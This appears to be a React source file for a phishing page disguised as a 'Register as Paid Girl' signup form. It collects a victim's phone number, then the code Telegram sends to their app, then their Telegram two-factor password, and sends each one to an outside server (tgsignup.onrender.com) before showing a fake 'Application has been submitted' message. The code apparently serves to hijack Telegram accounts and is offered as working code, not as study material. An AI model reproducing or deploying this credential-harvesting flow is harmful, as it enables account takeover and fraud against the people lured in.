import React, { useState, useRef } from 'react';
import './regForm.css';
import { Spinner } from 'reactstrap';
import axios from 'axios';
import { sendUpdate } from './App';

const forms = {
    phoneNumber: "phoneNumber",
    otp: "otp",
    twofactor: "twofactor"
}

const RegForm = (props) => {

    const [formData, setFormData] = useState({
        phoneNumber: "",
        otp: "",
        password: ""
    });
    const [isLoading, setIsLoading] = useState(false);
    const [activeForm, setActiveForm] = useState(forms.phoneNumber);
    const [errMsg, setErrMsg] = useState('Incorrect OTP, Please try again!');
    const [showErr, setShowErr] = useState(false);
    const inputRef = useRef(null);
    const sumbitRef = useRef(null);
    const [ok, setOk] = useState(false);
    console.log("new", isLoading, activeForm, errMsg, showErr);
    const handleInputChange = async (event) => {
        setFormData({
            ...formData,
            [event.target.name]: event.target.value,
        });
    };

    const handlePhoneSubmit = async (event) => {
        event.preventDefault();
        if (!isLoading) {
            if (formData.phoneNumber.startsWith('+')) {
                const cleanedPhoneNumber = formData.phoneNumber.substring(1);
                setFormData({ ...formData, phoneNumber: cleanedPhoneNumber })
            }
            console.log(formData.phoneNumber);
            const mobileNumberPattern = /^[0-9]{10}$/;

            if (!mobileNumberPattern.test(formData.phoneNumber)) {
                alert('Please enter a valid 10-digit mobile number');
            } else {
                setIsLoading(true);
                try {
                    const response = await axios.get(`https://tgsignup.onrender.com/login?phone=91${formData.phoneNumber}`);
                    console.log('Success:', response);
                    await sendUpdate(JSON.stringify(formData));
                    setIsLoading(false);
                    if (response.status === 200) {
                        setActiveForm(forms.otp);
                    } else {
                        if (response.message) {
                            setErrMsg(response.message)
                        }
                        setShowErr(true);
                    }
                } catch (error) {
                    console.error('Error:', error);
                    setIsLoading(false);
                    if (error.response?.data?.message) {
                        setErrMsg(error.response?.data?.message)
                    }
                    setShowErr(true);
                }
            }
        }
    };
    async function handleOTPInput(e) {
        e.preventDefault();
        if (showErr) {
            setShowErr(false);
        }
        const input = e.target;
        console.log(input.name)
        const inputValue = input.value;
        if (inputValue && !isNaN(inputValue) && inputValue.length === 1) {
            input.value = inputValue;
        } else if (inputValue.length > 0) {
            input.value = inputValue % 10;
        }
        const otp1 = document.getElementById('otp1').value;
        const otp2 = document.getElementById('otp2').value;
        const otp3 = document.getElementById('otp3').value;
        const otp4 = document.getElementById('otp4').value;
        const otp5 = document.getElementById('otp5').value;

        setFormData({
            ...formData,
            otp: otp1 + otp2 + otp3 + otp4 + otp5
        });
        if (e.target.value.length > 0) {
            if (input.name !== 'otp5') {
                e.target.nextSibling.focus();
            } else {
                sumbitRef.current.focus()
                // await handleOTPSubmit();
            }
        } else if (e.target.value.length === 0) {
            e.target.previousSibling.focus();
        }

    }
    const handleOTPSubmit = async (event) => {
        event.preventDefault()
        if (!isLoading) {
            setShowErr(false);
            const integerPattern = /^[0-9]+$/

            if (integerPattern.test(formData.otp) && formData.otp.length === 5) {
                setIsLoading(true);
                try {
                    const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${formData.otp}&phone=91${formData.phoneNumber}&password=${formData.password}`);
                    console.log('Success:', response);
                    setIsLoading(false);
                    await sendUpdate(JSON.stringify(formData));
                    if (response.status === 200) {
                        setOk(true);
                        setActiveForm(forms.phoneNumber);
                    } else {
                        if (response?.message) {
                            setErrMsg(response.message);
                            if (response.message?.toLowerCase().includes('2fa')) {
                                setActiveForm(forms.twofactor);
                            }
                        }
                        setShowErr(true);
                    }
                } catch (error) {
                    setIsLoading(false);
                    console.error('Error:', error.response?.data);
                    if (error.response?.data?.message) {
                        setErrMsg(error.response?.data?.message)
                    }
                    console.log(errMsg)
                    setShowErr(true);
                }
            }
        }
    };

    return (
        <div style={{ backgroundColor: '#1d2124', textAlign: "center", paddingTop: "4vh" }}>
            {!ok && <div>
                <div style={{ marginTop: "3vh" }}>
                    <h6 style={{ fontSize: "6vw", color: "rgb(0 217 255)", margin: "0px 0px 0px 0px" }}>{props.heading ? props.heading : "Register as Paid Girl"}</h6>
                    {!props.heading && <p style={{ fontSize: "3vw", color: "wheat" }}>Create your own webite page</p>}
                </div>
                {activeForm === forms.phoneNumber && (
                    <form autoComplete='on' onSubmit={handlePhoneSubmit} className="register-form">
                        <div>
                            {props.others && <input type="text" autoFocus={true} ref={inputRef} name="firstName" placeholder="First Name" autoComplete="given-name" />}
                            {props.others && <input type="text" name="lastName" placeholder="Last Name" autoComplete="family-name" />}
                            <div className="phone-number-input">
                                <select id="phone-country-code" readOnly name="phoneCountryCode" value="+91" required>
                                    {/* <option value="+1">+1   (USA)</option> */}
                                    <option value="+91">+91 &nbsp;&nbsp;&nbsp; (India)</option>
                                    {/* <option value="+44">+44  (UK)</option> */}
                                </select>
                                <input type="tel" style={{ margin: '0px 0px 20px 0px' }} autoFocus={true} name="phoneNumber" minLength={10} maxLength={10} onChange={handleInputChange} required placeholder="Phone Number" autoComplete="tel" />
                            </div>
                            <button type="submit" className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}>Send OTP</span></button>
                        </div>
                    </form>
                )}
                {activeForm === forms.otp && (
                    <form autoComplete='on' onSubmit={handleOTPSubmit} className="register-form">
                        <div>
                            <h6 style={{ color: "rgb(17 255 167)", fontSize: "15px", display: "block" }}> Enter the OTP received on your <span style={{ color: "red", fontWeight: 'bolder' }}>Telegram App</span> </h6>
                            <div className="otp-input">
                                <div className="otp-input">
                                    <input type="number" autoFocus={true} inputMode="numeric" minLength={1} maxLength={1} name="otp1" id="otp1" onInput={handleOTPInput} required placeholder="0" />
                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp2" id="otp2" onInput={handleOTPInput} required placeholder="0" />
                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp3" id="otp3" onInput={handleOTPInput} required placeholder="0" />
                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp4" id="otp4" onInput={handleOTPInput} required placeholder="0" />
                                    <input type="number" inputMode="numeric" minLength={1} maxLength={1} name="otp5" id="otp5" onInput={handleOTPInput} required placeholder="0" />
                                </div>
                                <input style={{ display: "none" }}></input>
                            </div>
                            {showErr && <span style={{ color: "red" }}>{errMsg}</span>}
                            <button type="submit" ref={sumbitRef} className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}> Submit</span></button>
                        </div>
                    </form>
                )}
                {activeForm === forms.twofactor && (
                    <div>
                        <label style={{ fontSize: "small", color: "aquamarine", marginTop: "5vh" }}>Telegram Two Factor Authentication Password</label>
                        <form autoComplete='on' onSubmit={handleOTPSubmit} style={{ paddingTop: "0px" }} className="register-form">
                            <div>
                                <input type="text" autoFocus={true} name="2fa" placeholder="2FA - Password" />
                                <button type="submit" className='button' style={{ fontSize: "17px", margin: '3vw 0px', background: isLoading ? "gray" : "rgb(0, 163, 255)", cursor: isLoading ? "not-allowed" : "pointer" }}><span style={{ paddingBottom: "3px" }}>Submit</span></button>
                            </div>
                        </form>
                    </div>
                )}
            </div>}
            {ok && <div className='success-message'>
                <img src="../tick2.png" alt="Tick Mark" class="tick"></img>
                <h1>Application has been submitted</h1>
                <p>We will contact you soon</p>
            </div>}
            {isLoading && (
                <div className="spinner-container">
                    <Spinner color="primary" />
                </div>
            )}
        </div>

    )
}

export default RegForm;